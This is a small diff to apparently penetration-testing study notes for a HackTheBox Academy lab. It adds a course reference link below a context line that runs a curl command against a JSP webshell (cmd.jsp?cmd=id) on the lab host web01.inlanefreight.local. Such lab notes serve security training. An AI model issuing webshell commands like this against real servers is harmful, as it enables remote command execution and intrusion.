@@ -125,3 +125,5 @@ After that we can use it like other webshell:
 ```
 curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 ```
+
+Ref: https://academy.hackthebox.com/app/module/113/section/1211
